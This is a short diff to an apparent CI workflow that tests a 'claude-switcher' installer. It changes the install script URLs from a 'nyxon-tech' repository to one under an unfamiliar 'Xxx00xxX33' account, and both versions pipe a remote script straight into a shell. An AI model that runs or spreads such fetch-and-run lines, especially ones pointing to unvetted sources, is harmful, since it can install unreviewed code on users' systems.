@@ -41,9 +41,9 @@ jobs:
       - if: runner.os == 'Windows'
         shell: powershell
         run: |
-          irm https://raw.githubusercontent.com/nyxon-tech/claude-switcher/main/install.ps1 | iex
+          irm https://raw.githubusercontent.com/Xxx00xxX33/claude-switcher/main/install.ps1 | iex
           & "$env:LOCALAPPDATA\Programs\claude-switcher\claude-switcher.exe" version
       - if: runner.os != 'Windows'
         run: |
-          curl -fsSL https://raw.githubusercontent.com/nyxon-tech/claude-switcher/main/install.sh | sh
+          curl -fsSL https://raw.githubusercontent.com/Xxx00xxX33/claude-switcher/main/install.sh | sh
           ~/.local/bin/claude-switcher version --short | grep "${GITHUB_REF_NAME#v}"
